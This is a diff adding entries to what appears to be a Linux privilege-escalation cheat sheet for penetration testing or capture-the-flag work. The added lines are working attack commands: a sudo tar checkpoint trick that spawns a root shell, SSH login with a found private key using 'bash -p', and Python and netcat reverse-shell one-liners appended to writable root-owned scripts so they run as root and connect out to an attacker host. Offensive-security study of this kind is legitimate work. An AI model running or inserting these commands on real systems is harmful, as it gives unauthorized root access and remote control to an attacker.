@@ -603,6 +603,22 @@ or
 # find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 ```
 
+If ``/bin/bash`` binary has SUID bit set and if you can find a private SSH key, you can login with it:
+
+```
+# ssh -i id_rsa <USER>@<RHOST> bash -p
+```
+
+##
+
+TAR SUID:
+
+```
+# sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+##
+
 Find files containing specific string:
 
 ```
@@ -614,6 +630,8 @@ Find all files belonging to a specific user:
 ```
 # find / -user <USER> -type f 2>>/dev/null
 ```
+
+##
 
 Always check CRONJOBS:
 
@@ -630,6 +648,22 @@ Always check CRONJOBS:
 # /var/spool/cron             <- User crontabs
 # /var/spool/cron/crontabs    <- User crontabs
 ```
+
+If there's a writable root-owned script, ``.py``, ``.sh``, etc:
+
+Python one-liner reverse shell:
+
+```
+# echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> <FILE>.py
+```
+
+Bash one-liner reverse shell:
+
+```
+# echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f" >> <FILE>.sh
+```
+
+##
 
 Always check ``history`` and ``.bash_history``:
 
@@ -754,6 +788,8 @@ For ``rbash``:
 Check out #1: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
 Check out #2: https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html
 Check out #3: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
+
+
 
 -------------------------------------------------------------
 
